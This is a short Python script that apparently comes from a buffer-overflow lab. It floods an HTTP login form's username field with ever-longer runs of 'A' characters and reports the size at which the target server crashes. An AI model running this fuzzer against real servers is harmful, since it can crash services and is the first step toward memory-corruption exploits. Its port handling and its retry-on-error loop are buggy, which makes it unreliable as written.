#!/usr/bin/python 
import socket
import time 
import sys

# Replace it with the server address
host = "10.1.1.15"
# Replace this with the desired port
port = 80
size = 100
while(size < 2000):
    try:
        print ("\nFuzzing system with %s bytes" % size )
        inputBuffer = "A" * size 

        # Define the information to be sent to the server
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n" 
        buffer += "Host: "+host+"\r\n" 
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n" 
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 \r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n" 
        buffer += "Referer: http://"+host+"/login\r\n" 
        buffer += "Connection: close\r\n" 
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n" 
        buffer += "Content-Length: "+str(len(content))+"\r\n" 
        buffer += "\r\n"
        buffer += content 

        # Create the socket and establish the connection to the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, 80)) 
        s.send(buffer) 
        s.close() 
        size += 100 
        time.sleep(1)

    except:
        print("Fuzzing crashed at {} bytes".format(len(inputBuffer)))

print ("\nFuzz Done!")

